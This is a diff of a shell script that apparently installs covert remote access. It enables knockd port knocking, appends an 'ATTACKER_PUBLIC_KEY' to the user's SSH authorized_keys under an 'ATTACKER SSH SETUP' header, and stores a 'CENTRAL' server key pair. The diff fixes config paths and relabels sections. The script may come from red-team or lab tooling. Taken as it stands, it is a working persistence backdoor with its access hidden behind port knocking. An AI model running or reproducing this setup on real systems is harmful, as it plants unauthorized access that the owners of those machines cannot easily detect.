@@ -20,22 +20,25 @@ sudo systemctl start netfilter-persistent
 sudo netfilter-persistent save
 sudo netfilter-persistent reload
 
-echo "$KNOCKD_CONF" >> /etc
-echo "$KNOCKD_CONF2" >> /etc/default/
+echo "$KNOCKD_CONF" >> /etc/knockd.conf
+echo "$KNOCKD_CONF2" >> /etc/default/knockd
 
 sudo systemctl enable knockd
 sudo systemctl start knockd
 
 
 ########################################################################
-######################## ATTACKER SETUP ################################
+###################### ATTACKER SSH SETUP ##############################
 ########################################################################
 mkdir -p ~/.ssh
 chmod 700 ~/.ssh
 echo "$ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
+
+########################################################################
+####################### SERVER SSH SETUP ###############################
+########################################################################
 echo "$SERVER_PUBLIC_KEY" >> ~/.ssh/CENTRAL.pub
 echo "$SERVER_PRIVATE_KEY" >> ~/.ssh/CENTRAL
 
-
-echo "Knockd is now setup. Make sure to save the knock order in /etc/knockd.conf before restarting."
+echo "All done. You should reboot."
